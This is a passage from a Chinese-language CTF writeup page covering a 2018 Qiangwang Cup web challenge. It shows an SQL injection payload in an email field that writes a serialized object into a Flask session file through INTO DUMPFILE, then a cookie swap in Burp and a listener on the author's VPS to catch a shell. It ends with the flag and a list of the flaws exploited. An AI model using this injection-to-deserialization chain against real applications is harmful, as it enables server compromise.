+<p>&#x4EE5;&#x4F7F;&#x7528;<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>&#x4F5C;&#x4E3A;cookie&#x4E3A;&#x4F8B;&#xFF0C;&#x5219;&#x5176;session&#x6587;&#x4EF6;&#x5B58;&#x5728;&#x4E8E;<code>/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3</code></p>
+<p>&#x5728;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x4E32;&#x524D;&#x9762;&#x6DFB;&#x52A0;<code>0x</code>&#xFF0C;&#x6784;&#x9020;&#x90AE;&#x7BB1;&#x5904;&#x7684;&#x6CE8;&#x5165;&#x70B9;&#xFF1A;</p>
+<pre><code>select id from user where email = &apos;test&apos;/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/&apos;/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3&apos;#@test.com&apos;
+</code></pre><p>&#x4E5F;&#x5373;&#x5728;&#x6CE8;&#x518C;&#x7684;&#x90AE;&#x7BB1;&#x5904;&#x586B;&#x5165;&#xFF1A;</p>
+<pre><code>test&apos;/**/union/**/select/**/0x63636F6D6D616E64730A.../**/into/**/dumpfile/**/&apos;/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3&apos;#@test.com
+</code></pre><p>&#x70B9;&#x51FB;submit&#x540E;&#x51FA;&#x73B0;<code>Please use a different email address.</code>&#x3002;</p>
+<p>&#x63A5;&#x7740;&#x5728;burp&#x4E2D;&#x6293;&#x53D6;&#x8BBF;&#x95EE;index&#x7684;&#x5305;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;cookie&#x4E3A;<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>&#xFF0C;&#x5728;&#x81EA;&#x5DF1;&#x7684;vps&#x4E0A;&#x76D1;&#x542C;&#x5BF9;&#x5E94;&#x7684;&#x7AEF;&#x53E3;&#xFF1A;</p>
+<p>     <a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210556-416f6304-302d-1.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210556-416f6304-302d-1.jpeg" alt="">
+     </a></p>
+<p>flag&#xFF1A;QWB{pyth0n1s1ntere3t1ng}</p>
+<p>&#x603B;&#x7ED3;:</p>
+<ul>
+<li>wtforms.validators&#x7684;Email&#x7C7B;&#x9A8C;&#x8BC1;&#x4E0D;&#x5B8C;&#x5584;</li>
+<li>flask&#x7684;session&#x5904;&#x7406;&#x673A;&#x5236;</li>
+<li>python&#x6C99;&#x7BB1;&#x9003;&#x9038;</li>
+<li>python&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</li>
+<li>&#x4E00;&#x70B9;&#x201C;&#x5C0F;&#x5C0F;&#x201D;&#x7684;&#x8111;&#x6D1E;</li>
+</ul>
+<p>Refference:</p>
+<ul>
+<li><a href="http://bugs.leavesongs.com/PYTHON/Python%E5%BA%93WTForm%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4URLXSS%E6%BC%8F%E6%B4%9E/" target="_blank">P&#x5E08;&#x5085;&#xFF1A;Python&#x5E93;WTForm&#x8FC7;&#x6EE4;&#x4E0D;&#x4E25;&#x5BFC;&#x81F4;URLXSS&#x6F0F;&#x6D1E;</a></li>
+</ul>
+<script src="_gitbook_plugin_analytics.js"></script>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="all.html" class="navigation navigation-prev " aria-label="Previous page: 目前已收录">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="2018ddctf.html" class="navigation navigation-next " aria-label="Next page: 2018DDCTF">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"2018强网杯Web","level":"1.5.1","depth":2,"next":{"title":"2018DDCTF","level":"1.5.2","depth":2,"path":"articals/2018ddctf.md","ref":"articals/2018ddctf.md","articles":[]},"previous":{"title":"目前已收录","level":"1.5","depth":1,"path":"articals/all.md","ref":"articals/all.md","articles":[{"title":"2018强网杯Web","level":"1.5.1","depth":2,"path":"articals/2018qiangwang.md","ref":"articals/2018qiangwang.md","articles":[]},{"title":"2018DDCTF","level":"1.5.2","depth":2,"path":"articals/2018ddctf.md","ref":"articals/2018ddctf.md","articles":[]},{"title":"2019全国信安赛","level":"1.5.3","depth":2,"path":"articals/2019national.md","ref":"articals/2019national.md","articles":[]},{"title":"2019DDCTF","level":"1.5.4","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},{"title":"2017全国信安赛","level":"1.5.5","depth":2,"path":"articals/2017national.md","ref":"articals/2017national.md","articles":[]},{"title":"2019西湖论剑预选赛","level":"1.5.6","depth":2,"path":"articals/2019xihulunjian.md","ref":"articals/2019xihulunjian.md","articles":[]},{"title":"实验吧web部分","level":"1.5.7","depth":2,"path":"articals/shiyanbar_web.md","ref":"articals/shiyanbar_web.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","highlight","sitemap","analytics","search-plus","anchor-navigation-ex","fancybox"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fancybox":{"helpers":{"buttons":{}}},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/2018qiangwang.md","mtime":"2019-04-26T15:11:57.159Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-26T15:26:03.798Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fancybox/jquery.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fancybox/jquery.mousewheel.pack.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fancybox/jquery.fancybox.pack.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fancybox/jquery.fancybox-buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fancybox/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
